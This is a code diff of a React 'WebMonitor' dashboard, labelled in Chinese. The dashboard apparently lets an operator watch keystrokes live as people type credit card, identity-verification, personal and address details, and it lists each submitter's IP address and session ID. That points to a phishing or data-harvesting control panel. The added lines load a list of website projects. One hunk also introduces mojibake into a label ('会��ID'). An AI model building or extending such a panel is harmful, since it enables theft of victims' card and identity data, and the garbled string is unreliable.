@@ -231,7 +231,7 @@ const getSubmissionTypeName = (type: string) => {
   switch (type) {
     case "personal_info": return "个人资料";
     case "credit_card": return "信用卡信息";
-    case "identity_verification": return "身���验证";
+    case "identity_verification": return "身份验证";
     case "address_proof": return "地址证明";
     default: return "其他文档";
   }
@@ -243,12 +243,35 @@ export function WebMonitor() {
   const [isRefreshing, setIsRefreshing] = useState(false);
   const { submissions, isFieldTyping, getFieldValue, isSubmitting } = useKeystrokeMonitor(submissionData);
 
-  // 获取网页制作中的页面列表
+  // 动态获取网页制作中的网站项目列表
+  const [websiteProjects, setWebsiteProjects] = useState([]);
   const [webPages] = useState([
     { id: 'home', name: '首页', route: '/', isActive: true },
     { id: 'about', name: '关于我们', route: '/about', isActive: false },
     { id: 'contact', name: '联系方式', route: '/contact', isActive: false },
   ]);
+
+  // 加载网站项目列表
+  useEffect(() => {
+    const loadWebsiteProjects = () => {
+      const projects = JSON.parse(localStorage.getItem('website_projects') || '[]');
+      setWebsiteProjects(projects);
+    };
+
+    // 初始加载
+    loadWebsiteProjects();
+
+    // 监听项目更新事件
+    const handleProjectsUpdate = (event) => {
+      setWebsiteProjects(event.detail);
+    };
+
+    window.addEventListener('websiteProjectsUpdated', handleProjectsUpdate);
+
+    return () => {
+      window.removeEventListener('websiteProjectsUpdated', handleProjectsUpdate);
+    };
+  }, []);
 
   // 过滤数据逻辑
   let filteredSubmissions = submissions;
@@ -751,7 +774,7 @@ export function WebMonitor() {
                       <span className="font-medium">{submission.ipAddress}</span>
                     </div>
                     <div>
-                      <span className="text-muted-foreground">会话ID: </span>
+                      <span className="text-muted-foreground">会��ID: </span>
                       <span className="font-medium">{submission.sessionId || "N/A"}</span>
                     </div>
                   </div>
